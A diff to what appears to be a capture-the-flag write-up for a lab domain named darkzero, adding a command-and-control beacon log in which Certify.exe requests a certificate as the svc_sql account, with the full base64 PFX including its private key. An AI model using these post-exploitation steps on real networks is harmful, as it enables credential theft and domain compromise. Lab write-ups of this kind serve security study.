@@ -474,3 +474,66 @@ Ill download the exe and run it through beacon
 ```
 
 I can use this template to request a certificate
+
+```python
++--- Task [c73966e9] closed ----------------------------------------------------------+
+
+[20/08 20:18:23] ethan [5f3c6c5f] beacon > execute-assembly /home/kali/htb/darkzero/Certify.exe request --ca dc02.darkzero.ext\darkzero-ext-DC02-CA --template User
+[20/08 20:18:23] [*] Task: execute .NET assembly
+[20/08 20:18:25] [*] Agent called server, sent [972.14 Kb]
+[20/08 20:18:38] [+] BOF output
+
+
+[!] CoInitializeSecurity has already been called. DCOM-related actions may not work as intended.
+
+   _____          _   _  __          
+  / ____|        | | (_)/ _|         
+ | |     ___ _ __| |_ _| |_ _   _    
+ | |    / _ \ '__| __| |  _| | | |   
+ | |___|  __/ |  | |_| | | | |_| |   
+  \_____\___|_|   \__|_|_|  \__, |   
+                             __/ |   
+                            |___./   
+  v2.0.0                         
+
+[*] Action: Request a certificate
+
+[*] Current user context    : darkzero-ext\svc_sql
+[*] No subject name specified, using current context as subject.
+
+[*] Template                : User
+[*] Subject                 : CN=svc_sql, CN=Users, DC=darkzero, DC=ext
+
+[*] Certificate Authority   : dc02.darkzero.ext\darkzero-ext-DC02-CA
+[*] CA Response             : The certificate has been issued.
+[*] Request ID              : 4
+
+[*] Certificate (PFX)       :
+
+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
+Mk3fhaMGzxtxUHBNvLCn0DXNd++vVPKPc2eu9Ce+vJEGpZ1ml29jn4EDNx28izUzviOm3WPXbzGv+ddRaZvohVFEqtVVDS7y4tqHdY5NOEIUldqXvcQGni2v4fmgcnHWYEMPu8E7u3kOaFwVsqEEggPoz8YEftKEl80unpVNAgMBAAGjggL7MIIC9zAXBgkrBgEEAYI3FAIECh4IAFUAcwBlAHIwHQYDVR0OBBYEFDmsUcGHXboQrMGaTrt9MEea
+FIYbMA4GA1UdDwEB/wQEAwIFoDAfBgNVHSMEGDAWgBTVGX4skGZLzN8bp34CEvJ1YUGqjDCB0AYDVR0fBIHIMIHFMIHCoIG/oIG8hoG5bGRhcDovLy9DTj1kYXJremVyby1leHQtREMwMi1DQSxDTj1EQzAyLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWRhcmt6ZXJv
+LERDPWV4dD9jZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgccGCCsGAQUFBwEBBIG6MIG3MIG0BggrBgEFBQcwAoaBp2xkYXA6Ly8vQ049ZGFya3plcm8tZXh0LURDMDItQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleQSCA+glMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1D
+b25maWd1cmF0aW9uLERDPWRhcmt6ZXJvLERDPWV4dD9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTApBgNVHSUEIjAgBgorBgEEAYI3CgMEBggrBgEFBQcDBAYIKwYBBQUHAwIwLwYDVR0RBCgwJqAkBgorBgEEAYI3FAIDoBYMFHN2Y19zcWxAZGFya3plcm8uZXh0ME0GCSsGAQQBgjcZAgRA
+MD6gPAYKKwYBBAGCNxkCAaAuBCxTLTEtNS0yMS0xOTY5NzE1NTI1LTMxNjM4NTEyLTI1NTI4NDUxNTctMTEwMzBEBgkqhkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYFKw4DAgcwCgYIKoZIhvcNAwcwDQYJKoZIhvcNAQELBQADggIBAM2hFkH/xL8oVrmvrXzU/cWOUfnuPkDpsxudIjIguZQpq8rfjV7O
+zpRflyUOC6w5q9HhpVVfvpIcRmKEcOrAkcMwooO1iV5ce7FBsVPWeryl5UpwM4NSAfIQpk6kn9poEBQKdhYasxJVvlf2WKv6VXqOWG6/O8TulXH1tygBDeleFZb1XmKuzOvvJaAMKtp9DbAwyEZMnjsRBby5ZN9P+amSraFS9IYOMBK+neqSmNjLaxvzhxikCgCWIXcSjloHqwSCAc/pmfnIuKeUffb5ZtTdTJcvUMWpFhIUuWCPzF7h10TzRAS8
+OsPhHQpG++EoaKvnqnvjsXH4Zwjdwh7GdjvVm0zJs7w5ZCL7vfOpmAjfROEpvqSfIJGXHqyCbKc5PFF6pkpKGOnkFF+vef4jcVcebUQmpoEZaiw92jMWVB+yQbxmiobCSPdu7X2RJI5olc3RxvoVFTn4D2ATMz38/ri0e2GOjv0qZBIVI0ipjJ9XlQvsT/o0uZHfuZ08S6Z7XCHMNPZtHfaH5z/61hz/aEcKlPetHf/KxR5jaV8E7QmOeIOq3wG2
+3z/Dwc0ZmzKfCMU2hSRjLFW95Low3VGuFAkTHj/vT+aBNHIkHZ48SHhIIDcwxkje4xZxkfQx5r6AwLEEDmzSdNX0hl6W+Pu2/dg67F+Getd8H99YL/tF0HikOsBRbDGBgjAjBgkqhkiG9w0BCRUxFgQUOaxRwYdduhCswZpOu30wR5oUhhswWwYJKoZIhvcNAQkUMU4eTABEAEMAPQBlAHgAdAAsAEQAQwA9AGQAYQByAGsAegBlAHIAbwAsAEMA
+TgA9AFUAcwBlAHIAcwAsAAQTQwBOAD0AcwB2AGMAXwBzAHEAbAAAAAAAAAAAAAAAAAAAAAA=
+
+Certify completed in 00:00:11.6880631
+[20/08 20:18:38] [+] BOF finished
+
++--- Task [5f3c6c5f] closed ----------------------------------------------------------+
+```
+
+I now have a certificate encoded in base64
